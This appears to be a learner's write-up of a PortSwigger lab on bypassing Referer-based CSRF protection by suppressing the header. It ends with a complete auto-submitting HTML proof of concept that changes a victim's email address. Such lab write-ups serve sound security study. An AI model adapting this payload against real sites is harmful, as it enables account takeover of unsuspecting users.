# CSRF where Referer validation depends on header being present

> **Vulnerability Type:** CSRF  
> **Lab URL:** [CSRF Lab](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)

## Objective  
Perform a CSRF attack that gets around the cross-domain protections to change the email address on another user's account

## Setup  
- **Tools Used:** Burp Suite  
- **Environment Details:** PortSwigger Lab
---
### 1. **Discovery**  
- **Initial Observations:**  
  - On the change email HTTP request, there is no CSRF token.
- **Testing Approach:**  
  - The Referer header can be edited in the query parameter, but when you attempt to change the domain, it blocks the request. To bypass this, I need to remove the header as the domain cannot be edited. The lab name hints at this. I use the generate CSRF POC function and add `<meta name="referrer" content="no-referrer">` to remove the referrer header from the victim request.
---
### 2. **Exploitation**  
- **Payload Used:**  
  ```html
  <html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
   <meta name="referrer" content="no-referrer">
    <form action="https://0ab700d4039d202c83950192002100a0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="whatever@gmail.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
  </html>
